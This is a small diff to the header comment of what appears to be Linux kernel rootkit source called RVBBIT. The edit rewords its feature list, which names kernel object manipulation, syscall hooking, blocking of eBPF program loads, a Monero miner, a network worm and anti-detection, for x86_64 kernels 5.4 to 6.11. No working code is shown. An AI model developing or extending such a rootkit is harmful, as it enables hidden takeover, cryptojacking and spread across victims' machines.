@@ -1,6 +1,6 @@
 /*
  * RVBBIT - Next-Generation Linux Kernel Rootkit
- * Features: DKOM, syscall hooking, eBPF bypass, XMR miner, network worm, anti-detection
+ * Features: DKOM, syscall hooking, eBPF program load blocking, XMR miner, network worm, anti-detection
  * Kernel: Linux 5.4 – 6.11 (x86_64)
  */
 #include <linux/module.h>
